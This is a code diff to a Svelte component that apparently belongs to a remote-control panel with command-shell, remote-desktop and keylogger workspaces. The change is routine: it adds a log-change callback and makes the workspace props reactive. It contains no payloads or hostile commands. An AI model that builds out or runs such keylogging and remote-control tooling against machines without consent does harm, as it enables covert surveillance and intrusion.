@@ -20,11 +20,13 @@
 	const {
 		client,
 		tool,
-		agent = null
+		agent = null,
+		onLogChange
 	} = $props<{
 		client: Client;
 		tool: ClientToolDefinition;
 		agent?: AgentSnapshot | null;
+		onLogChange?: (log: WorkspaceLogEntry[]) => void;
 	}>();
 
 	const isWorkspace = isWorkspaceTool(tool.id);
@@ -34,19 +36,20 @@
 	const requiresAgent = dialogToolId ? workspaceRequiresAgent.has(dialogToolId) : false;
 	const missingAgent = requiresAgent && !agent;
 
-	const workspaceProps: WorkspaceProps | null =
-		dialogToolId && workspaceComponent
-			? (() => {
-					const base: WorkspaceProps = { client };
-					if (dialogToolId === 'cmd') {
-						base.agent = agent;
-					}
-					if (dialogToolId === 'remote-desktop') {
-						base.initialSession = null;
-					}
-					return base;
-				})()
-			: null;
+	const workspaceProps = $derived.by(() => {
+		if (!dialogToolId || !workspaceComponent) {
+			return null;
+		}
+
+		const base: WorkspaceProps = { client };
+		if (dialogToolId === 'cmd' && agent) {
+			base.agent = agent;
+		}
+		if (dialogToolId === 'remote-desktop') {
+			base.initialSession = null;
+		}
+		return base;
+	});
 
 	onMount(() => {
 		if (!browser || !dialogToolId) {
@@ -85,10 +88,10 @@
 		</AlertDescription>
 	</Alert>
 {:else if keyloggerMode}
-	<KeyloggerWorkspace {client} mode={keyloggerMode} />
+	<KeyloggerWorkspace {client} mode={keyloggerMode} {onLogChange} />
 {:else if workspaceComponent && workspaceProps}
 	{@const Component = workspaceComponent}
-	<Component {...workspaceProps} />
+	<Component {...workspaceProps} {onLogChange} />
 {:else}
 	<Alert>
 		<AlertCircle class="h-4 w-4" />
